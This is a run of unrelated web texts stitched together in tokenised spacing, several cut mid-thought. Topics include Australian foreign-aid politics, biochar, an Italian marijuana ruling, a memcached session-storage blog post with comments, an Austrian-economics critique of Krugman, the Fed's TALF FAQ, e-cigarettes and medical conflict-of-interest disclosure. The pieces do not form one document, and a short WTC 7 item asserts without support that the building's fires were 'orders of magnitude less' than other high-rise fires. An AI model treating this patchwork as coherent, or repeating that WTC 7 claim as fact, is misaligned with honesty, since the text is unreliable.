“ This tool will be replaced by self - reacting friction stir welds should we undertake a Shuttle extension . ”
A full status update on shuttle extension will be published on Thursday .

PRIME Minister Kevin Rudd has set the Christian lobby , a key Labor powerbroker and a crucial balance - of - power Senator against him over Australia 's move to scrap a 13 - year - old ban on foreign aid being used to fund safer abortions for women in poor nations .
But the historic shift was lauded by a wide array of aid agencies , women 's groups , family planning experts and many cross-party federal politicians , who said it would save the lives of thousands of women who would otherwise die in botched backyard operations .
The Prime Minister was targeted by his Christian base after revealing that he backed but did not personally support the decision by Foreign Minister Stephen Smith to axe the ban - two months after US President Barack Obama overturned a similar ban in his country .
Mr Rudd told a meeting of Labor MPs he had " long - standing conservative views " on the issue , but said a clear majority of Labor MPs backed a change .
The Australian Christian Lobby , which gave him a platform to reach 100,000 Christians by TV before the last election , threatened to campaign against him at the next election .
The vending machine , which has been greeted by the country 's pizza - makers with a mixture of horror and disdain , has clear plastic windows to allow customers to see the ingredients being mixed and cooked .
It can produce a piping hot pizza for just 3.50 euros ( £ 3.30 ) - about half what you would pay in a restaurant .
Giant microwave ovens that can " cook " wood into charcoal could become our best tool in the fight against global warming , according to a leading British climate scientist .
Chris Turney , a professor of geography at the University of Exeter , said that by burying the charcoal produced from microwaved wood , the carbon dioxide absorbed by a tree as it grows can remain safely locked away for thousands of years .
The technique could take out billions of tonnes of CO 2 from the atmosphere every year .
Fast - growing trees such as pine could be " farmed " to act specifically as carbon traps — microwaved , buried and replaced with a fresh crop to do the same thing again .
Turney has built a 5 m - long prototype of his microwave , which produces a tonne of CO 2 for $ 65 .
He plans to launch his company , Carbonscape , in the UK this month to build the next generation of the machine , which he hopes will process more wood and cut costs further .
He is not alone in touting the benefits of this type of charcoal , known as biochar or biocharcoal .
The Gaia theorist , James Lovelock , and Nasa 's James Hansen have both been outspoken about the potential benefits of biochar , arguing that it is one of the most powerful potential solutions to climate change .
In a recent paper , Hansen calculated that producing biocharcoal by current methods of burning waste organic materials could reduce global carbon dioxide levels in the atmosphere by 8 ppm ( parts per million ) over the next 50 years .
That is the equivalent of three years of emissions at current levels .
Turney said biochar was the closest thing scientists had to a silver - bullet solution to climate change .
Processing facilities could be built right next to forests grown specifically to soak up CO2 .
" You can cut trees down , carbonise them , then plant more trees .
The forest could act on an industrial scale to suck carbon out of the atmosphere . "
The biochar could be placed in disused coal mines or tilled into the ground to make soil more fertile .
Its porous structure is ideal for trapping nutrients and beneficial micro-organisms that help plants grow .
It also improves drainage and can prevent up to 80 % of greenhouse gases such as nitrous oxides and methane from escaping from the soil .
In a recent analysis of geo-engineering techniques published in the journal Atmospheric Chemistry , Tim Lenton , a climate scientist at the University of East Anglia , rated producing charcoal as the best technological solution to reducing CO 2 levels .
He compared it to other geo-engineering techniques such as dumping iron in oceans or seeding clouds to reflect the sun 's radiation and calculated that by 2100 a quarter of the effect of human - induced emissions of CO 2 could be sequestered with biochar production from waste organic matter , giving a net reduction of 40 ppm in CO2 concentration .
Johannes Lehmann of Cornell university has calculated that it is realistically possible to fix 9.5 bn tonnes of carbon per year using biochar .
The global production of carbon from fossil fuels stands at 8.5 bn tonnes .
Charcoal is usually produced by burning wood in high - temperature ovens but this process is dirty and only locks around 20 - 30 % of the mass of the wood into charcoal .
Turney 's idea to use a microwave , which he found could lock away up to 50 % of the wood 's mass , came from a cooking accident when he was a teenager , in which he mistakenly microwaved a potato for 40 minutes and found that the vegetable had turned into charcoal .
" Years later when we were talking about carbon sequestration I thought maybe charcoal was the way to go , " he said .
A number of governments are investing their hopes for sequestering CO 2 from the atmosphere in large - scale carbon capture and storage projects .
But Turney said this would not provide a full solution .
" It 's only for large single sources of emissions like large power stations and that accounts for about 60 % of emissions .
It does n't deal with anything up in the atmosphere already which is driving the changes we see today . "
Chris Goodall , writer of the Carbon Commentary blog , proposed biochar as a solution to climate change in his recent book , Ten Technologies to Save the Planet .
" The only big problem is organising it on a large enough scale , " he said .
" Organising it so that farmers get paid and put the charcoal in the ground rather than burning it for their own food is a big problem to organise on a global scale . "
This could be done if biochar were incorporated into the carbon markets making it more profitable to bury rather than burn .
There is an emerging campaign , he said , to get
governments to recognise biochar in the post - Kyoto agreement on climate change that will be negotiated in Copenhagen later this year .
Medicinal purposes are one thing , but marijuana received an unexpected recreational endorsement when Italy 's highest court ruled that an Italian shepherd 's smoking habit could be justified because he only had sheep for company .
The 45 - year - old shepherd was caught with marijuana in his car as he was setting off for an extended period with his flock in the mountains of Alto Adige , in the far north of the country .
Police found 38 grams ( about 1.3 ounces ) in the car , and the shepherd , identified only as Giorgio D. , was convicted of possession .
But upholding an appeal against the verdict , the Court of Cassation ruled that the shepherd was justified in possessing this small quantity of the drug on account of " the long and solitary period " he was about to spend " in the countryside and the mountains , due to the migration of his flock of sheep " .
It is not the first time that Italy 's most senior judges have chosen to smile indulgently at the smoking of marijuana in unusual contexts .
Last July , the court overturned the conviction of a Rastafarian , Giuseppe G. , as it concluded that the drug " was a possible conveyor to a psychophysical state connected to contemplative prayer … in the belief that the sacred herb grew on the tomb of Solomon , acquiring its potency from that wise king " .

One of the most common questions in memcached land is the ever obnoxious " how do I put my sessions in memcached ? " .
The long standing answer is usually " you do n't " , or " carefully " , but people often walk the dark path instead .
Many libraries do this as well , although I 've seen at least one which gets it .
This is n't as huge of a deal as people make it out to be .
I 've been asked about this over the mailing list , in IRC , in person , and even in job interviews .
What people end up doing gives me the willies !
Why !
Why why why ...
Well , I know why .
So what is the deal with sessions ?
Why does everyone want to jettison them from mysql / postgres / disk / whatever ?
Well , a session is :
- Almost always larger than 250 bytes , and almost always smaller than 5 kilobytes .
- Read from datastore for every logged in ( and often logged out ) user for every dynamic page load .
- Written to the datastore for every dynamic page load .
- Eventually reaped from the database after N minutes of inactivity .
Ok well that sucks I guess .
Every time a user loads a page we read a blob row from mysql , then write a blob row back .
This is a lot slower than row without blobs .
Alright , so I see it now .
Memcached to the rescue !
Er , except maybe it's a little complicated to actually memcached these things , since we need a write for every read ...
Why not just use memcached for sessions !?
It lines up perfectly !
Check it out :
- Set a memcached expire time for the max inactivity for a session .
Say 30 minutes ...
- Read from memcached .
- Write to memcached .
- A miss from memcached means the user is logged out .
Voila !
ZERO reads or writes to the database , fantastic !
Fast .
Except I really do n't like the tradeoffs here .
This is one example where I believe the experience of both your users and your operations team is cheapened .
Users now get logged out when anything goes wrong with memcached !
Operations has to dance on eggshells .
Or needles .
Painful .
- Evictions are serious business .
Even if you disable them ( - M ) , out of memory errors means no one can log into your site .
- Upgrading memcached , OS kernel , hardware , etc , now means kicking everyone off your site .
- Adding / removing memcached servers kicks people off your site .
Even with consistent hashing , while the miss rate is low it 's not going to be zero .
So now what ?
Well we have zero accesses on our database , so it 's fast !
But we can't ever touch memcached again in fear of ticking off users .
Progress be damned !
Before you all think I 'm completely off my rocker , I will admit there are some legitimate reasons to do this .
If the way your site works does n't really impact users on loss of a session , or impacts few enough users , you can use this design pattern .
How many people are actually affected if you get logged out of wikipedia.org ?
Well , the people writing revisions certainly mind , but the greater userbase is unaffected .
They 're a non profit , they understand the tradeoff , etc .
So that 's fine .
It 's not fine for a lot of the people I see suggesting it or doing it .
As developers get more comfy with memcached the session issue will become more of an obvious bottleneck .
The memcached / mysql hybrid really is n't that bad at all .
You can get rid of over 90 % of the database reads , a lot of the writes , and leave your users logged in during rolling upgrades of memcached .
First , recap the components involved :
The page session handler itself , and some batch job which reaps dead sessions .
For small websites ( like a vbulletin forum ) these batch jobs are often run during page loads .
For larger sites they will be crons and so forth .
This batch job can also be used to save data about sessions for later analysis .
The pattern is simple .
For reads fetch from memcached first , database second .
For writes write to memcached , unless you have n't synced the session to the database in the last N seconds .
So if a user is clicking around they will only write to the database once every 120 seconds , and write to memcached every time .
Now modify the batch job .
Crawl all expired sessions , and check memcached for the latest data .
If session is not really expired do n't expire it then , if it is use the latest possible data from memcached .
Write back to the database .
Easy .
You take the tradeoff of sessions being mildly lossy for recent information , but you gain reliability back in your system .
Reads against the database should be almost nonexistent , and write load should drop significantly , but not as much as reads .
So please , if you run some website I might eventually use , do n't put memcached in a place where restarting individual servers might piss me off .
Thanks :)
I 'd like to also challenge maintainers of session libraries for all languages to turn this design pattern into tunable ( note all the places where I wrote N ) libraries folks can plug in and use .
The more standard this stuff is the more likely the next fancy startup is going to get it right .
Reuse is a great thing .
I can't say enough about how great efforts like krow I hope you 're all enjoying the 1.2.6 stable release of memcached .
Do n't want to hear no whining about it crashing !

How to " crawl " expired sessions ?
I like your idea , but there 's one step which is not clear how to implement ... it may be because I do n't have much Memcache experience under my belt .
You mention to " crawl all expired sessions . "
As far as I know , memcached only lets you retrieve / delete entries if you know the full key .
How do you know the keys / sessions to remove when " crawling , " if all session information is being stored in memcached , and you can't query anything ?
From : netherben Date : November 3rd , 2008 07:33 am ( UTC ) ( Link ) Re : How to " crawl " expired sessions ?
In this pattern , since you have a copy of the sessions in the DB as well , you can query for session - IDs from the Database , and check the databases sessions against the sessions in memcache .
We use a similar method at Hab.la , but write to DB when an ' important ' session change has occurred , or if the DB session is nearing expiry .
I like the timer idea .

From : dormando Date : November 3rd , 2008 07:37 am ( UTC ) ( Link ) Re : How to " crawl " expired sessions ?
This pattern discusses using memcached to augment the database usage ... so you should already have your session data in the database , which is trawlable .
for each expired session in database
- find related memcached key , test if session was updated and thus not expired
- expire session , delete memcached key , if session is still expired .
- log useful data somewhere .
From : ext2366 Date : February 26th , 2010 10:24 am ( UTC ) ( Link ) Re : How to " crawl " expired sessions ?
I 've been thinking about implementing this pattern .
However , there 's one thing that I have n't come up with a good solution to yet .
We expire sessions after 24 hours .
Without something running more often , it seems that when we come to crawl the sessions , the memcached version may have been evicted .
I guess there are 2 options .
1. Somehow make sure the do n't get evicted - maybe by giving memcached lots of memory .
2 . Make a list of sessions as they get touched , and crawl that every half hour or so , persisting them .
This ends up with writes , or some sort of in - memory structure .
Do you have any other ideas ?
From : dormando Date : February 26th , 2010 11:37 pm ( UTC ) ( Link ) Re : How to " crawl " expired sessions ?
You should be trawling the sessions often , and expiring them when they 're actually expired .
For example if you hold sessions for 24 hours , you 'd scan through sessions that have n't been updated in the db in over 30 minutes , sync their memcached keys , and if they 're expired , expire them .
You 're still only crawling stuff that 's not being hit all the time , which should reduce most of your extra writes .
You could reduce it more by having a " dirty " column and only looking at sessions which have been idle for more than 15 - 30 minutes and have n't been dirtied by a sync caused by normal user activity .
So even though you expire sessions every 24 hours , an active user should be writing his session back to the db every 5 - 15 minutes .
Which dirties it and updates the stamp in the DB for the last time the session was known active ...
No in memory structures , just a single index lookup .
From : brong Date : April 21st , 2009 05:00 am ( UTC ) ( Link ) Interesting .
I 've been considering doing , well , pretty much exactly the same " do n't cause IO to the mysql machines for sessions " issue .
I have responses to your issues :
- Evictions are serious business .
Even if you disable them ( - M ) , out of memory errors means no one can log into your site .
So make sure you have enough memory for all your sessions plus some serious slack .
We have a bunch of machines with 32 Gb RAM .
I have calculated that 2 Gb would be used about 10 % at our maximum logged - in - user load , and that will hardly affect those hosts at all .
So long as you can actually get stats out of memcached ( currently 37 % " alive " in the most active slab ) then you can monitor and scale as needed .
Besides - LRU .
The ones that get kicked off are already pretty stale assuming you have n't sized your memcached insanely low .
- Upgrading memcached , OS kernel , hardware , etc , now means kicking everyone off your site
Ahh , yes - " single instance " hashing .
So write the session to multiple memcacheds each time .
In the worst case you may need to try multiple fetches .
Still no database IO though .
Most times you 'll fetch the cache record successfully from a random server .
The general answer to " single point of failure " is store in multiple places .
Hardly takes a genius to figure that one out .
- Adding / removing memcached servers kicks people off your site .
Even with consistent hashing , while the miss rate is low it 's not going to be zero .
See above .
Store more than one copy .
Duh .
We can shut down any one of our machines with a couple of seconds notice and be sure of consistency .
A hard failure not so much ( cyrus and mysql replication are both running async for performance ) , but it 's still pretty close .
Maybe lose a couple of seconds ' worth of data - and that happens very rarely , only if there 's complete hardware failure .
We have n't switched to memcached yet - I 've only been trialing the setup on a testbed - but shutting down one of the servers did n't affect the active sessions at all .
There are two things stopping me from switching things over now - some poorly factored APIs mean there are two other places I would need to convert from mysql specific queries to use the abstract session interface , and we do n't _yet_ have monitoring infrastructure to make sure that all the memcacheds are online and working .
Everything else gets a health check every 2 minutes and we get paged if it goes down .
I would n't want live session in the memcacheds until we have a test for them .
In a recent debate , prominent Keynesian professor and blogger Brad DeLong claimed that the Austrian explanation of the business cycle “ does not work as an intellectual enterprise . ” [ 1 ]
DeLong quotes Paul Krugman who , back in December , apparently dealt the Austrian diagnosis a crushing defeat on both theoretical and empirical grounds .
In the present article , I will set the record straight .
Krugman ’s theoretical criticism of ( what he dismissively calls ) the “ hangover theory ” of recessions is silly , and his empirical test is also a poor one .
Once we set up a more appropriate test , the “ hangover ” theory — i.e. , the Mises - Hayek explanation — passes with flying colors .
Krugman ’s Two - Pronged Critique of the “ Hangover Theory ”
On his popular New York Times blog , back in December , Krugman lamented the idiocy of his colleagues .
He ca n’t believe that John Cochrane would say something this ( allegedly ) foolish :
“ We should have a recession , ” Cochrane said in November , speaking to students and investors in a conference room that looks out on Lake Michigan .
“ People who spend their lives pounding nails in Nevada need something else to do . ”
In response to such ( apparent ) nonsense , Krugman offers first a theoretical objection :
The basic idea is that a recession , even a depression , is somehow a necessary thing , part of the process of “ adapting the structure of production . ”
We have to get those people who were pounding nails in Nevada into other places and occupation , which is why unemployment has to be high in the housing bubble states for a while .
The trouble with this theory , as I pointed out way back when , is twofold :
It does n’t explain why there is n’t mass unemployment when bubbles are growing as well as shrinking — why did n’t we need high unemployment elsewhere to get those people into the nail - pounding - in - Nevada business ?
Before dealing with Krugman ’s second ( and empirical ) objection , let ’s handle this theoretical objection .
You ca n’t understand Austrian business - cycle theory ( ABCT ) unless you first understand the Austrian view of the capital structure of the economy .
In this article , I showed how Krugman was simply incapable of grasping ABCT because he lacks a rich enough model of capital .
For those newcomers who are unfamiliar with ABCT , I strongly encourage you to read the fuller discussion in the hyperlinked article .
For our purposes here , a brief recapitulation of the argument :
In a market economy , prices really serve a function ; they are not mere appendages of exploitative power relations , but instead market prices signal real , underlying scarcity and help everyone in the economy adjust his plans in light of reality .
The interest rates on various loans also mean something ; they are not arbitrary .
In particular , the market interest rate coordinates the “ intertemporal ” ( i.e. , across - time ) activities of investors , businesses , and consumers .
If consumers become more future oriented and want to reduce consumption in the near term in order to provide more for later years , what happens in the free market is that the increased savings push down interest rates , which then signal entrepreneurs to borrow more and invest in longer projects .
Thus resources ( such as labor , oil , steel , and machine time ) get redirected away from present goods , like TVs and sports cars , and the freed - up resources flow into capital or investment goods like tractors and cargo ships .
Now when the Federal Reserve artificially reduces interest rates below their free - market level , it sends a false message to entrepreneurs .
Firms begin expanding as if consumers have increased their savings , but in fact consumers have reduced their savings ( due to the lower interest rates ) .
Businesses that churn out durable goods , such as furnaces , cargo ships , and , yes , houses will find business booming , because these sectors respond positively to low interest rates .
On the other hand , other sectors do n’t need to contract , because ( unlike the scenario of genuine savings ) nobody is cutting back on consumption .
This is precisely why the Fed - induced boom is unsustainable — real resources have not been released from consumer sectors in order to fuel the expansion of the capital sectors .
Because modern economies are so complex , the charade can continue for a few years , with entrepreneurs cutting corners and “ consuming capital ” ( i.e. , postponing necessary replacement and maintenance on equipment ) while both investment and consumer goods keep flowing out of the pipeline at increased rates .
But the music eventually stops , since ( after all ) the Fed ’s printing of green pieces of paper does n’t really make a country wealthier .
When the Fed “ cuts interest rates ” it is n’t really creating more capital for businesses to borrow ; it is instead distorting the signal that the market interest rate was trying to convey .
So , in this context , Krugman the Nobel laureate is confused .
When the Fed starts dumping wads of newly printed cash into particular sectors of the economy , why does this foster a period of prosperity — however illusory and fleeting it may be ?
Why instead does n’t the money drop cause millions of people to get laid off ?
I admit I feel sheepish even phrasing the question that way , but go reread Krugman ’s blog post ; that ’s what he ’s asking .
The answer , of course , is that businesses armed with newly printed Fed dollars must bid away workers from their original niches in the structure of production .
Obviously , this process does n’t lead to mass unemployment .
The workers voluntarily quit their original jobs because the inflated money supply has allowed a few firms to offer them higher salaries .
The Fed ’s injection of new money has not yet distorted the whole economy , and so there is no reason for other businesses to suddenly find themselves in trouble and lay off workers at the beginning of the artificial boom .
In contrast , once the bubble has popped , many firms realize they are embarked on unsustainable projects .
They need to lay off their workers .
Unemployment goes up , and only as workers reluctantly accept lower wages can they be reintegrated into the economy .
On average , workers are earning less during the bust period than at the height of the boom .
This is because the salaries and wages of the boom period were exaggerations of the true “ fundamentals ” of worker productivity , and also because the fundamentals themselves have been hurt due to the waste of capital during the boom period .
In short , workers on average are not as economically productive during the recession because the whole structure of production has been thrown out of whack by the Fed ’s injections of funny money .
It is much harder for workers to switch jobs and take a pay cut versus quitting a job in order to take a better one that pays more .
That ’s the simple explanation for why the Fed - induced boom sees low unemployment , while the necessary bust experiences high unemployment .
The Housing Bubble Has Nothing to Do With Job Losses ?!
After his theoretical objection , Krugman turns to the data to raise a second objection to the “ hangover theory ” :
It does n’t explain why recessions reduce [ employment ] across the board , not just in industries that were bloated by a bubble .
One striking fact , which I ’ve already written about , is that the current slump is affecting some non-housing - bubble states as or more severely as the epicenters of the bubble .
Here ’s a convenient table from the BLS , ranking states by the rise in unemployment over the past year .
Unemployment is up everywhere .
And while the centers of the bubble , Florida and California , are high in the rankings , so are Georgia , Alabama , and the Carolinas .
This is rather surprising , is n’t it ?
Forget the Austrian theory ; Krugman is here saying that the bursting of the housing bubble does n’t help explain the onset of the recession !
But do n’t worry , Krugman ’s analysis is flawed ; you ’re not going crazy .
First , note that the BLS table Krugman links to looks at the over - the - year change in unemployment ( by state ) from December 2007 to December 2008 .
Now , is that really a good measure of whether the bursting of the housing bubble has anything to do with the recession ?
After all , the bubble had well burst by December 2007 .
So if the “ hangover theorists ” are right , you would expect the connection between unemployment jumps and housing - price collapses to be weaker the farther along you get from the bursting of the bubble .
In response to an email from a grad - school friend , I decided to check on the relation during a time frame that more tightly captures the bursting of the housing bubble .
The OFHEO has quarterly data on home prices by state ; I picked the top of the bubble as the second quarter in 2006 .
Then I picked the other variable to be the change in unemployment ( in terms of absolute point changes , not percentages of percentages ) from June 2006 to December 2008 , which is available ( though not in a very convenient form ) from the BLS .
Armed with this data , I ranked the states according to these two criteria , and looked at the worst 10 in both rankings .
In other words , I looked at the list of the 10 states that had seen the biggest percentage decline in home prices since the 2nd quarter of 2006 , and I also looked at the list of the 10 states that had seen the biggest jump in the unemployment rate from June 2006 to December 2008 .
The 7th through 10th slots on the two lists did n’t match up , but check out the worst 6 slots in both lists :
Ranking of States By Point Increase in Unemployment Rate , June 2006 — December 2008
Rhode Island ( + 4.9 ) Florida ( + 4.8 ) Nevada ( + 4.8 ) California ( + 4.4 ) North Carolina ( + 3.9 ) Michigan ( + 3.8 )
Ranking of States By Percentage Drop in OFHEO Housing Price Index , 2Q 2006 — 4Q 2008
California , — 27 % Nevada , — 26 % Florida , — 22 % Arizona , — 16 % Rhode Island , — 11 % Michigan , — 11 %
Note that North Carolina and Arizona are the only ones that do n’t match .
That seems like a very strong correlation .
( Depending on how we frame the problem , the chances of this matching occurring randomly are anywhere from 1 in 8,400 to about 1 in 350,000 . )
Conclusion
Brad DeLong and Paul Krugman continue to mock the Austrian explanation for the business cycle , but their ridicule is based on their own deficient model of the economy ’s capital structure .
Moreover , Krugman ’s quick empirical points turn out , upon closer inspection , to support the Austrian position .
Unfortunately , because DeLong and Krugman have so fundamentally misdiagnosed the problem , their “ solutions ” are a recipe for further disaster .
Notes

DeLong ’s discussion of ( what he calls ) the “ Marx - Hoover - Hayek axis ” of business - cycle theory can safely be joined at the 10:00 mark of the video .

The Best of Bob Murphy
The Federal Reserve established the TALF ( Term Asset - Backed Loan Facility Programme ) to help provide liquidity to the asset - backed securities market — you know , the market with all those toxic CDOs , MBSs , and the like .
This facility goes into effect this month .
So , it would be nice to take a look at what it will achieve and how it operates .
The following page is now up on the New York Fed ’s site regarding the TALF .
Pay attention to my highlighting .
I sum it up at the bottom :
GENERAL
Why is the Federal Reserve establishing the TALF ?
The asset - backed securities ( ABS ) market has been under strain for some months .
This strain accelerated in the third quarter of 2008 and the market came to a near - complete halt in October .
At the same time , interest rate spreads on AAA - rated tranches of ABS rose to levels well outside the range of historical experience , reflecting unusually high risk premiums .
The ABS markets historically have funded a substantial share of consumer credit and U.S. Small Business Administration ( SBA ) - guaranteed small business loans .
Continued disruption of these markets could significantly limit the availability of credit to households and small businesses and thereby contribute to further weakening of U.S. economic activity .
The TALF is designed to increase credit availability and support economic activity by facilitating renewed issuance of consumer and small business ABS at more normal interest rate spreads .
How will the TALF work ?
Under the TALF , the Federal Reserve Bank of New York will provide non-recourse funding to any eligible borrower owning eligible collateral .
On a fixed day each month , borrowers will be able to request up to two three - year TALF loans .
Loan proceeds will be disbursed to the borrower , contingent on receipt by the New York Fed ’s custodian bank ( custodian ) of the eligible collateral , an administrative fee , and margin , if applicable .
As the loan is non-recourse , if the borrower does not repay the loan , the New York Fed will enforce its rights in the collateral and sell the collateral to a special purpose vehicle ( SPV ) established specifically for the purpose of managing such assets .
The New York Fed will publish a Master Loan and Security Agreement ( MLSA ) which will provide further details on the terms that will apply to borrowings under the TALF .
The TALF loan is non-recourse except for breaches of representations , warranties and covenants , as further specified in the MLSA .
ELIGIBLE BORROWERS
Who may borrow under the TALF ?
Any U.S. company that owns eligible collateral may borrow from the TALF provided the company maintains an account relationship with a primary dealer .
An entity is a U.S. company if it is ( i ) a business entity or institution that is organized under the laws of the United States or a political subdivision or territory thereof
( U.S. - organized ) and conducts significant operations or activities in the United States ( regardless of whether any such an entity has a parent company that is not U.S. - organized ) , including any
U.S. - organized subsidiary of such an entity ; ( ii ) a U.S. branch or agency of a foreign bank ( other than a foreign central bank ) that maintains reserves with a Federal Reserve Bank ; or ( iii ) an investment fund that is U.S. - organized and managed by an investment manager that has its principal place of business in the United States .
Notwithstanding the foregoing , a U.S. company excludes any entity that is controlled by a foreign government or is managed by an investment manager controlled by a foreign government .
May a U.S. subsidiary of a foreign entity borrow from the TALF ?
A U.S. - organized operating subsidiary of a foreign entity may borrow from the TALF so long as ( i ) the U.S. subsidiary conducts significant operations or activities in the United States and ( ii ) the U.S. subsidiary is not directly or indirectly controlled by a foreign government .
A U.S. - organized investment fund subsidiary of a foreign entity may borrow from the TALF so long as ( i ) the U.S. subsidiary is managed by an investment manager that has its principal place of business in the United States ; ( ii ) the U.S. subsidiary is not directly or indirectly controlled by a foreign government ; and ( iii ) the investment manager of the U.S. subsidiary is not directly or indirectly controlled by a foreign government .
What is an “ investment fund ” for purposes of the TALF eligible borrower definition ?
An investment fund is any type of pooled investment vehicle , including a hedge fund , a private equity fund , and a mutual fund , or any vehicle that primarily invests in eligible collateral and borrows from the TALF .
What types of investment funds are eligible borrowers ?
Investment funds that are organized in the United States and managed by an investment manager that has its principal place of business located in the United States are eligible borrowers for purposes of the TALF .
However , any investment fund that is controlled by a foreign government or is managed by an investment manager controlled by a foreign government is not an eligible borrower for purposes of the TALF .
Example
InvestcoBermuda is a “ master ” investment fund organized in Bermuda that makes joint investments on behalf of InvestcoUS , a U.S. - organized investment fund , and InvestcoCayman , a Cayman Islands - organized investment fund .
InvestcoBermuda , InvestcoUS , and InvestcoCayman are all managed by an investment manager with its principal place of business in the United States .
Only InvestcoUS is an eligible borrower because it is the only investment fund that is U.S. - organized .
If , however , InvestcoBermuda establishes Newco , a subsidiary investment fund , in the United States and hires its U.S. - based investment manager to manage Newco , Newco would be an eligible borrower for purposes of the TALF .
What is the definition of “ controlled ” for purposes of the eligible borrower definition ?
For purposes of the eligible borrower definition , a foreign government controls a company if , among other things , the foreign government owns , controls , or holds with power to vote 25 percent or more of a class of voting securities of the company .
Can a newly formed investment fund borrow from the TALF ?
Yes , so long as it satisfies all the eligible borrower requirements set forth above .
ELIGIBLE COLLATERAL
What types of ABS are eligible collateral under the TALF ?
Eligible collateral ( eligible ABS ) will include U.S. dollar - denominated cash ( that is , not synthetic ) ABS that have a credit rating in the highest long - term or short - term investment - grade rating category from two or more major nationally recognized statistical rating organizations ( NRSROs ) and do not have a credit rating below the highest investment - grade rating category from a major NRSRO .
Eligible small business ABS also will include U.S. dollar - denominated cash ABS that are , or for which all of the underlying credit exposures are , fully guaranteed as to principal and interest by the full faith and credit of the U.S. government .
All or substantially all of the credit exposures underlying eligible ABS must be exposures to U.S. - domiciled obligors .
The underlying credit exposures of eligible ABS must be auto loans , student loans , credit card loans , or small business loans fully guaranteed as to principal and interest by the SBA .
The set of permissible underlying credit exposures of eligible ABS may be expanded over time .
The underlying credit exposures must not include exposures that are themselves cash or synthetic ABS .
The expected life for credit card or auto loan ABS can not be greater than five years .
Eligible ABS must be cleared through the Depository Trust Company and , except for SBA Pool Certificates or Development Company Participation Certificates , must be issued on or after January 1 , 2009 .
All or substantially all of the credit exposures underlying eligible auto loan ABS ( except auto dealer floorplan ABS ) must have been originated on or after October 1 , 2007 .
All or substantially all of the credit exposures underlying eligible student loan ABS must have had a first disbursement date on or after May 1 , 2007 .
SBA Pool Certificates and Development Company Participation Certificates must have been issued on or after January 1 , 2008 , regardless of the dates of the underlying loans or debentures .
The SBA - guaranteed credit exposures underlying all other eligible small business ABS must have been originated on or after January 1 , 2008 .
Eligible credit card and auto dealer floorplan ABS must be issued to refinance existing credit card and auto dealer floorplan ABS , respectively , maturing in 2009 and must be issued in amounts no greater than the amount of the maturing ABS .

NIST ’s explanation for the collapse of World Trade Center 7 on September 11th follows the logic in the cartoon above .
Specifically , NIST claims that the collapse of building 7 is “ the first known instance of fire causing the total collapse of a tall building ” .
But then goes on to argue :
“ The fires in WTC 7 , which were uncontrolled but otherwise similar to fires experienced in other tall buildings , caused an extraordinary event ”
In fact , the fires in WTC 7 were orders of magnitude less than other high - rise fires , which did not produce collapses .
My parody from yesterday is not much sillier than NIST ’s real explanation .

Jim Palasota took a drag of his cigarette , exhaling a wisp of watery vapor .
He closed his eyes .
" Just like the real thing , " he said .
Two Scottsdale businesses , including one where Palasota works , are profiting from a trend of " smokeless " cigarettes that circumvent Arizona 's anti-smoking laws .
Like real cigarettes , " e- cigarettes " offer smokers a shot of nicotine .
But instead of producing smoke , they emit a watery mist .
Businesses market them as a way to legally inhale in restaurants and bars .
Based in the Scottsdale Airpark , Sottera Inc. sells the smoke - free devices through the trade name NJOY .
The company , which opened in 2007 , bills itself as the largest wholesale manufacturer of the electronic gadgets .
" It 's a great opportunity because it 's a new product , " said Palasota , vice president of sales and marketing for NJOY .
Target and Costco sell NJOY cigarettes on their Web sites .
By April , Walgreens will be selling them in stores .
In July , the company introduced the " NPRO , " a shorter version of the cigarette that looks more real like the real thing .
Like other models , the battery - powered device contains liquid made of nicotine , water , flavoring and propylene glycol , an odorless substance found in toothpaste and cosmetics .
When smokers inhale , the mixture is converted into a nicotine " mist " that is absorbed into the lungs .
Because it is not a tobacco product , the device falls outside the purview of the state 's anti-smoking law , according to Don Herrington , bureau chief for epidemiology and disease control for the Arizona Department of Health Services .
Another e-cigarette purveyor , Crown7 , has been featured in US News and World Report , USA Today and the New York Post .
The Scottsdale company is growing by leaps and bounds , said founder Ron MacDonald .
MacDonald said he put up initial funding for NJOY but left two years ago to pursue Crown7 .
His new product , dubbed " the Hydro , " rivals a regular cigarette in size .
The most potent version carries 18 milligrams of nicotine compared with 22 milligrams in regular cigarettes .
The cost is $ 75 , plus $ 10 for replacement cartridges equivalent to about two packs .
The company also sells car and USB chargers .
" We 've got new products coming out shortly , " MacDonald said .
Palasota noted that electronic cigarettes are not a form of anti-smoking therapy .
The World Health Organization has warned that , unlike traditional nicotine replacements , e-cigarettes lack scientific evidence that confirms their effectiveness .
What they do lack are the harmful chemicals found in most tobacco products .
Some consumers and professionals maintain the e-cigarettes are a healthier alternative to traditional tobacco .
In a statement last month , Dr. Jonathan Winickoff of Harvard Medical School called the Crown7 " a thousand times safer than cigarettes . "
Ex-smoker Patty Rosebery loves the cigarettes so much that she decided to sell them .
" I want to put this out there for people to quit , " said Rosebery , an independent sales rep for NJOY .
Megan Smith , 28 , of Scottsdale , has smoked cigarettes for 10 years .
She began using an electronic one this month .
" I feel like I can run a marathon , " Smith said .
" At first , you do n't know if you really believe it .
Now , I love it . "
ACADEMIC FREEDOM AND CONTROVERSY OVER THE PUBLICATION OF FACTUALLY CORRECT , PUBLICLY AVAILABLE INFORMATION
Jonathan Leo , Ph.D .
Over the past several years , I have written about the potential impact of conflicts - of - Interest in medicine ( COI ) .
I have also watched how the mainstream media reports the results of medical research with great interest .
As a neuroanatomist , I was particularly interested in a recent study published in the Journal of the American Medical Association ( JAMA ) , which reported that the prescription of escitalopram lowered the rate of depression in patients who had recently suffered a stroke .
I co-authored a letter to JAMA with Dr. Jeffrey Lacasse of Arizona State University , in which we pointed out the problem of selective reporting within the study : Problem - solving psychotherapy was statistically equivalent to escitalopram , but this was never mentioned .
In the mass media , the principal investigator recommended that all stroke victims should be prescribed antidepressants without mentioning that problem - solving therapy was statistically equivalent .
In the process of reading this body of research , my co-author and I noticed a problem with the COI disclosures in this positive trial of escitalopram published in JAMA .
The principal investigator on the project , Dr. Robert Robinson , had not declared that he had previously received funding from Forest Laboratories , the makers of escitalopram .
The financial relationship with Forest Laboratories was well - documented and easily discoverable via a Google search , as evidenced by Dr. Robinsonπs previous self - disclosures in varied sources such as here , here , here , here , and here .
I urge my students to carefully consider COI when they read an article as such conflicts can be important in how one interprets research .
I do not consider myself a whistleblower , but I do think that the full story behind clinical trials should be transparent so that patients and doctors can make informed decisions .
This instance of unreported COI in a gold - standard study published in JAMA seemed like a perfect case study of problematic COI issues .
First , I informed JAMA of what we had found .
We then co-authored a commentary describing this saga and the potential implications , linking together the unreported COI , selective reporting in JAMA , and in the mass media .
